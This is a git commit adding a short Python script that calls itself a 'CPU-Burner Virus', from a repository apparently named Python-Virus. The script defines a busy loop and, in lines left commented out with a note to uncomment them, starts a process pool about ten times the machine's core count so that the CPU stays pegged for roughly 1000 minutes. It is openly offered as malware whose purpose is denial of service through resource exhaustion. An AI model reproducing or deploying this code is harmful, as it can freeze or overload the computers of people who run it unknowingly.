69854da5deb040111fdfb3b960bebfbb48af935a
Cᴏɴғᴜsᴇᴅ Cʜᴀʀᴀᴄᴛᴇʀ <121636230+ConfusedCharacter@users.noreply.github.com>
2023-01-02 15:33:09 -0800

    Create CPU-Burner.py

---
+++ CPU-Burner.py
@@ -0,0 +1,26 @@
+# CPU-Burner Virus
+# By Confused Character
+# github https://github.com/ConfusedCharacter/Python-Virus/
+
+
+from multiprocessing import Pool
+from multiprocessing import cpu_count
+import time
+import os
+
+def start(x):
+    timeout = time.time() + 60*1000
+    while True:
+        if time.time() > timeout:
+            break
+        x*x
+
+
+processes = cpu_count()
+# please be sure then clear hastags
+#pool = Pool(processes)
+#pool.map(start, range(processes*10))
+
+
+#█▀▀ █▀█ █▄░█ █▀▀ █░█ █▀ █▀▀ █▀▄   █▀▀ █░█ ▄▀█ █▀█ ▄▀█ █▀▀ ▀█▀ █▀▀ █▀█
+#█▄▄ █▄█ █░▀█ █▀░ █▄█ ▄█ ██▄ █▄▀   █▄▄ █▀█ █▀█ █▀▄ █▀█ █▄▄ ░█░ ██▄ █▀▄
